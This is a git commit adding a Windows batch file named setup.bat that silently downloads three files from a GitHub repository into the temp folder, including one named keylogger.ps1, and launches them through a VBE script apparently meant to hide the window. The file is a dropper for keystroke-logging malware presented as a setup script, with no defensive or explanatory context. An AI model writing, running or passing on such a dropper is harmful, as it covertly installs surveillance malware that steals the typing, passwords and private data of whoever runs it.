b52c385bfbfcb0c907029df8520b12b1db5fa814
Ale-cyber <59205495+Ale-cyber@users.noreply.github.com>
2021-09-09 17:37:34 +0200

    Add files via upload

---
+++ setup.bat
@@ -0,0 +1,6 @@
+@echo off
+cd %temp%
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/invisible.vbe -o i.vbe
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/keylogger.ps1 -o p.ps1
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/run.bat -o r.bat
+wscript.exe "i.vbe" "r.bat"
